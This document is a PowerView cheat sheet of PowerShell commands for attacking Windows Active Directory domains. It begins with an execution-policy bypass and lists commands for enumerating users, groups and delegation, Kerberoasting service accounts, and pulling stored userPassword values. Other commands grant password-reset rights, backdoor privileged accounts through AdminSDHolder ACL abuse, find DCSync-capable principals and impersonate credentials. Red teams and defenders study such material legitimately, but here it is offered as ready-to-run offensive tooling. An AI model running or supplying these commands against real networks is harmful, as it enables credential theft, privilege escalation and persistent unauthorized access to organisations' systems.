
### Start PowerShell with Execution Policy Bypass
```cmd
powershell -ep bypass
```

### Load PowerView
```powershell
.\PowerView.ps1
```

### Enumerate Domain Users
```powershell
Get-NetUser | select on
```

### Enumerate Domain Groups with Admin in the Name
```powershell
Get-NetGroup -GroupName *admin*
```

## Advanced Usage

### Get all Groups a User is a Member of
```powershell
Get-DomainGroup -MemberIdentity <User/Group>
```

### Get all Effective Members of a Group
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Use an Alternate Credential
```powershell
$SecPassword = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $SecPassword)
Get-DomainUser -Credential $Cred
```

### Find all Users with an SPN Set (Likely Service Accounts)
```powershell
Get-DomainUser -SPN
```

### Enumerate all Servers that Allow Unconstrained Delegation
```powershell
$Computers = Get-DomainComputer -Unconstrained
```

### Return the Local Groups of a Remote Server
```powershell
Get-NetLocalGroup SERVER.domain.local
```

### Kerberoast Users in a Particular OU
```powershell
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=domain,DC=local"
```

### Enumerate all Global Catalogs in the Forest
```powershell
Get-ForestGlobalCatalog
```

### Enumerate the Current Domain Controller Policy
```powershell
$DCPolicy = Get-DomainPolicy -Policy DC
```

### Set the Specified Property for a Given User Identity
```powershell
Set-DomainObject testuser -Set @{'property'='value'} -Verbose
```

### Enumerate Permissions for GPOs
```powershell
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)'
```

### If Running in -sta Mode, Impersonate Another Credential
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf
```

### Find All Machine Accounts in Privileged Groups
```powershell
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
```

### Enumerate All Foreign Users in the Global Catalog
```powershell
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://domain.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl
```

### Check if any User Passwords are Set
```powershell
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

### Grant User 'will' the Rights to Change 'matt's Password
```powershell
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

### Audit the Permissions of AdminSDHolder, Resolving GUIDs
```powershell
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -ResolveGUIDs
```

### Backdoor the ACLs of all Privileged Accounts with the 'matt' Account Through AdminSDHolder Abuse
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity matt -Rights All
```

### Retrieve Most Users who Can Perform DC Replication (i.e., DCsync)
```powershell
Get-ObjectACL "DC=domain,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
```

### Find Linked DA Accounts Using Name Correlation
```powershell
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}
```

### Save a PowerView Object to Disk for Later Usage
```powershell
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml
```

### Use Alternate Credentials for Searching for Files on the Domain
```powershell
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
```
